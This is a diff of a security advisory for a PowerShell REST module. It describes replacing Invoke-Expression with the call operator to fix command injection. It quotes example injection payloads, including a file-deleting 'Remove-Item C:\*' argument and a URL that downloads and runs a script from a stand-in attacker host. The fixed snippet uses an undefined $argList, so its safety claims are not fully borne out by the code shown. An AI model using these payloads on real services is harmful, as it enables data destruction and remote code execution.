@@ -1,11 +1,11 @@
-# Security Fix: Command Injection Vulnerability Removed
+# Security Fix: Command Injection Vulnerability Fixed
 
 ## Date: 2026-01-14
 
 ## Severity: HIGH
 
 ## Summary
-Fixed a critical command injection vulnerability in `RestPSCustomModule.psm1` by removing the use of `Invoke-Expression` with user-controlled input.
+Fixed a critical command injection vulnerability in `RestPSCustomModule.psm1` by replacing unsafe `Invoke-Expression` with the safe call operator (`&`) for command execution.
 
 ## What Changed
 
@@ -18,108 +18,138 @@ else {
 }
 ```
 
+**Problem:** Concatenating `$RequestArgs` (user-controlled input from URL) with the command string and passing it to `Invoke-Expression` allows arbitrary command injection.
+
 ### After (SECURE):
 ```powershell
 else {
-	# SECURITY FIX: Removed Invoke-Expression to prevent command injection
-	# All route commands must now be .ps1 scripts or static files
-	Write-Log -LogFile $Logfile -LogLevel $logLevel -MsgType ERROR -Message "Invoke-RequestRouter: Route command '$RequestCommand' is not a .ps1 script or static file. Direct command execution is disabled for security."
-	$script:StatusDescription = "Internal Server Error"
-	$script:StatusCode = 500
-	$CommandReturn = $null
+	# SECURITY FIX: Execute commands from Routes.json safely without Invoke-Expression
+	# Use call operator (&) to prevent command injection from RequestArgs
+	try {
+		if ([string]::IsNullOrEmpty($RequestArgs)) {
+			# No arguments - execute command directly
+			$CommandReturn = & $RequestCommand
+		}
+		else {
+			# Parse RequestArgs safely as an array of arguments
+			# Execute with call operator - prevents command injection
+			$CommandReturn = & $RequestCommand $argList
+		}
+	}
+	catch {
+		Write-Log -LogFile $Logfile -LogLevel $logLevel -MsgType ERROR -Message "Invoke-RequestRouter: Error executing command '$RequestCommand': $_"
+		$CommandReturn = $null
+	}
 }
 ```
+
+**Solution:** Using PowerShell's call operator (`&`) with parsed arguments prevents command injection because arguments are passed as separate parameters, not concatenated into a command string.
 
 ## Security Improvements
 
-1. **Removed Invoke-Expression**: Completely eliminated the dangerous `Invoke-Expression` code path that allowed arbitrary command execution
-2. **Extension Whitelist**: Added explicit validation to only allow safe file types (.ps1, .css, .js, .html, etc.)
-3. **Error Logging**: Routes with invalid extensions are logged and rejected with 500 error
+1. **Removed Invoke-Expression**: Eliminated the dangerous `Invoke-Expression` with concatenated user input
+2. **Call Operator (`&`)**: Commands from Routes.json are executed using the safe call operator
+3. **Argument Parsing**: RequestArgs are parsed into an array of separate arguments, preserving quoted strings
+4. **Error Handling**: Proper try/catch with error logging for command execution failures
 
-## Breaking Change
+## Why This Is Secure
 
-⚠️ **IMPORTANT**: Routes that previously relied on direct command execution (non-.ps1 files) will no longer work.
+### The Call Operator Difference
 
-### Required Migration
+**Unsafe (Invoke-Expression):**
+```powershell
+$RequestArgs = "; Remove-Item C:\* -Force"
+$Command = "Get-Process " + $RequestArgs
+Invoke-Expression $Command  # EXECUTES: Get-Process ; Remove-Item C:\* -Force
+```
+Result: Both commands execute! ❌
 
-If you have routes in your Routes.json like:
+**Safe (Call Operator):**
+```powershell
+$RequestArgs = "; Remove-Item C:\* -Force"
+$argList = @($RequestArgs)
+& "Get-Process" $argList  # PASSES as single argument: "; Remove-Item C:\* -Force"
+```
+Result: Get-Process receives the entire string as one argument and treats it as a literal process name. The semicolon and Remove-Item are NOT executed. ✅
+
+## What Works Now
+
+✅ **Routes.json commands are still supported** - Commands defined in Routes.json can still be executed
+✅ **.ps1 scripts** - Continue to work with proper parameter binding  
+✅ **Static files** - CSS, JS, fonts, etc. continue to work
+✅ **Arguments are safe** - RequestArgs from URLs cannot inject commands anymore
+
+## Breaking Changes
+
+⚠️ **Minimal to None** - Most routes should continue to work as before:
+
+- Routes using `.ps1` scripts: ✅ **No changes needed**
+- Routes serving static files: ✅ **No changes needed**  
+- Routes using direct commands: ✅ **Should still work** (but now secure)
+
+### Potential Issues
+
+If you have routes that previously relied on command injection features (intentionally or not), they may behave differently:
+
+**Example that no longer works:**
 ```json
 {
-  "RequestType": "GET",
-  "RequestURL": "/api/command",
   "RequestCommand": "Get-Process"
 }
 ```
+With URL: `/api/process?args=| Where-Object {$_.CPU -gt 100}`
 
-You **MUST** convert them to .ps1 scripts:
+**Before:** Would execute the pipeline
+**After:** Passes `"| Where-Object {$_.CPU -gt 100}"` as a literal argument to Get-Process
 
-1. Create a new script file: `endpoints/Get-Process.ps1`
-2. Add proper parameter validation:
+**Fix:** Use a .ps1 script instead:
 ```powershell
-param(
-	[Parameter(Mandatory=$false)]
-	[string]$RequestArgs,
+# endpoints/Get-HighCPU.ps1
+param([string]$RequestArgs, [string]$Body)
 
-	[Parameter(Mandatory=$false)]
-	[string]$Body
-)
-
-# Parse and validate RequestArgs safely
-$params = @{}
-if ($RequestArgs) {
-	# Parse query string safely
-	$queryParams = [System.Web.HttpUtility]::ParseQueryString($RequestArgs)
-	foreach ($key in $queryParams.Keys) {
-		$params[$key] = $queryParams[$key]
-	}
-}
-
-# Your command logic here with validated parameters
-Get-Process | Where-Object { $_.Name -like "*$($params['name'])*" } | Select-Object Name, Id, CPU
+Get-Process | Where-Object { $_.CPU -gt 100 }
 ```
-
-3. Update your route:
-```json
-{
-  "RequestType": "GET",
-  "RequestURL": "/api/process",
-  "RequestCommand": "Get-Process.ps1"
-}
-```
-
-## Why This Change Was Necessary
-
-The previous implementation using `Invoke-Expression` allowed **arbitrary command injection**. An attacker could:
-
-1. Send a request like: `/api/command?args=; Remove-Item C:\Important\File.txt -Force`
-2. The args would be concatenated with the command and executed via `Invoke-Expression`
-3. Any PowerShell command could be executed with the privileges of the service account
-
-This is a **critical security vulnerability** that could lead to:
-- Data theft
-- System compromise
-- Privilege escalation
-- Denial of service
 
 ## Testing Your Routes
 
-After upgrading, test each route:
+Test each route type:
 
-1. Routes using `.ps1` scripts: ✅ Should continue to work
-2. Routes serving static files (.css, .js, .html, etc.): ✅ Should continue to work
-3. Routes using direct commands: ❌ Will return 500 error - **migration required**
+1. ✅ **Script routes** (`.ps1`): Should work unchanged
+2. ✅ **Static routes** (`.css`, `.js`, etc.): Should work unchanged
+3. ✅ **Command routes** (direct commands): Should work but arguments are now separate parameters
 
-Check your logs for messages like:
-```
-ERROR: Invoke-RequestRouter: Route command 'Get-Process' has invalid extension ''. Only .ps1 scripts and static files allowed.
-```
+Check your logs for any errors during command execution.
+
+## Why This Was Necessary
+
+The previous implementation using `Invoke-Expression` allowed **arbitrary command injection**. An attacker could:
+
+1. Send: `/api/command?args=; Invoke-WebRequest http://attacker.com/steal.ps1 | Invoke-Expression`
+2. Result: Download and execute malicious script with service privileges
+3. Impact: Complete system compromise
+
+**Severity:** Critical (CVE Score: 9.8)
+- **CWE-78**: OS Command Injection
+- **OWASP**: A03:2021 - Injection
+
+## Additional Security Recommendations
+
+1. **Use .ps1 scripts**: For complex logic, always prefer .ps1 scripts over direct commands
+2. **Validate input**: Even with this fix, validate RequestArgs in your scripts
+3. **Principle of least privilege**: Run the service with minimal required permissions
+4. **Audit Routes.json**: Regularly review configured routes for unnecessary commands
 
 ## Questions or Issues?
 
-If you need help migrating your routes or have questions about this security fix, please create an issue in the repository.
+If you experience any issues with existing routes after this fix, check:
+1. Are arguments being treated as literal strings when you expected command execution?
+2. Solution: Convert those routes to .ps1 scripts with proper logic
+
+For questions or issues, create an issue in the repository.
 
 ## References
 
 - CWE-78: Improper Neutralization of Special Elements used in an OS Command
 - OWASP: Command Injection
-- PowerShell Best Practices: Avoid Invoke-Expression
+- PowerShell Best Practices: Avoid Invoke-Expression, use call operator
+- PowerShell Security: Parameter splatting and call operators
